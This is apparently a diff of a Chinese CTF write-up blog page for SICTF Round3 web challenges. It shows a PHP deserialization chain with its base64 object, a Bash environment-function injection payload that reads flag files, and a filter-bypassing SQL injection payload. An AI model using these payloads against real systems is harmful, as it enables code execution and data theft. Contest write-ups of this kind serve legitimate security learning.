+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'go'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'go'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>反序列化最终触发putenv()，这里和虎符CTF的ezphp很像，但是提示说了RUN ln -sf &#x2F;bin&#x2F;bash &#x2F;bin&#x2F;sh，那么system调用的就是bash -c，与p🐂的环境变量注入就一样了，直接利用环境变量注入执行命令</p>
 <p>反序列化链：</p>
-<pre><code class="php">&lt;?php
-class start
-&#123;
-    public $welcome;
-    public $you;
-&#125;
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">start</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$welcome</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$you</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
 
-class SE&#123;
-    public $year;
-&#125;
-class CR&#123;
-    public $last;
-    public $newyear=&quot;Worries&quot;;
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">SE</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$year</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">CR</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$last</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$newyear</span><span class="token operator">=</span><span class="token string double-quoted-string">"Worries"</span><span class="token punctuation">;</span>
 
-&#125;
+<span class="token punctuation">&#125;</span>
 
-class ET&#123;
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">ET</span><span class="token punctuation">&#123;</span>
 
-&#125;
-$a = new start();
-$b = new SE();
-$c = new CR();
-$d = new ET();
-$a-&gt;welcome=$b;
-$b-&gt;year=$c;
-$c-&gt;last=$d;
+<span class="token punctuation">&#125;</span>
+<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SE</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CR</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$d</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ET</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$a</span><span class="token operator">-></span><span class="token property">welcome</span><span class="token operator">=</span><span class="token variable">$b</span><span class="token punctuation">;</span>
+<span class="token variable">$b</span><span class="token operator">-></span><span class="token property">year</span><span class="token operator">=</span><span class="token variable">$c</span><span class="token punctuation">;</span>
+<span class="token variable">$c</span><span class="token operator">-></span><span class="token property">last</span><span class="token operator">=</span><span class="token variable">$d</span><span class="token punctuation">;</span>
 
-echo base64_encode(serialize($a));
-</code></pre>
-<pre><code>Tzo1OiJzdGFydCI6Mjp7czo3OiJ3ZWxjb21lIjtPOjI6IlNFIjoxOntzOjQ6InllYXIiO086MjoiQ1IiOjI6e3M6NDoibGFzdCI7TzoyOiJFVCI6MDp7fXM6NzoibmV3eWVhciI7czo3OiJXb3JyaWVzIjt9fXM6MzoieW91IjtOO30=
-</code></pre>
+<span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">Tzo1OiJzdGFydCI6Mjp7czo3OiJ3ZWxjb21lIjtPOjI6IlNFIjoxOntzOjQ6InllYXIiO086MjoiQ1IiOjI6e3M6NDoibGFzdCI7TzoyOiJFVCI6MDp7fXM6NzoibmV3eWVhciI7czo3OiJXb3JyaWVzIjt9fXM6MzoieW91IjtOO30&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>payload:</p>
-<pre><code>http://yuanshen.life:38989/?get[BASH_FUNC_echo%25%25]=()%20
-</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;yuanshen.life:38989&#x2F;?get[BASH_FUNC_echo%25%25]&#x3D;()%20&#123;%20cat &#x2F;f*;%20&#125;
+POST:
+go&#x3D;Tzo1OiJzdGFydCI6Mjp7czo3OiJ3ZWxjb21lIjtPOjI6IlNFIjoxOntzOjQ6InllYXIiO086MjoiQ1IiOjI6e3M6NDoibGFzdCI7TzoyOiJFVCI6MDp7fXM6NzoibmV3eWVhciI7czo3OiJXb3JyaWVzIjt9fXM6MzoieW91IjtOO30&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221754303.png" alt="image-20240218204623551"></p>
+<h1 id="hacker"><a href="#hacker" class="headerlink" title="hacker"></a>hacker</h1><p>无列名注入，过滤空格，使用&#x2F;**&#x2F;代替</p>
+<p>payload:</p>
+<pre class="line-numbers language-none"><code class="language-none">&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;&#96;2&#96;&#x2F;**&#x2F;from&#x2F;**&#x2F;(select&#x2F;**&#x2F;1,2&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;*&#x2F;**&#x2F;from&#x2F;**&#x2F;flag)a%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221754149.png" alt="image-20240220110233228"></p>
 
         </div>
 
@@ -776,7 +787,7 @@ echo base64_encode(serialize($a));
     <div class="post-toc">
         <div class="toc-title">On this page</div>
         <div class="page-title">SICTF Round3 Web题解</div>
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#100%EF%BC%85-upload"><span class="nav-text">100％_upload</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#EZ-SSRF"><span class="nav-text">EZ_SSRF</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Oyst3rPHP"><span class="nav-text">Oyst3rPHP</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Not-just-unserialize"><span class="nav-text">Not just unserialize</span></a></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#100%EF%BC%85-upload"><span class="nav-text">100％_upload</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#EZ-SSRF"><span class="nav-text">EZ_SSRF</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Oyst3rPHP"><span class="nav-text">Oyst3rPHP</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Not-just-unserialize"><span class="nav-text">Not just unserialize</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#hacker"><span class="nav-text">hacker</span></a></li></ol>
 
     </div>
 </div>
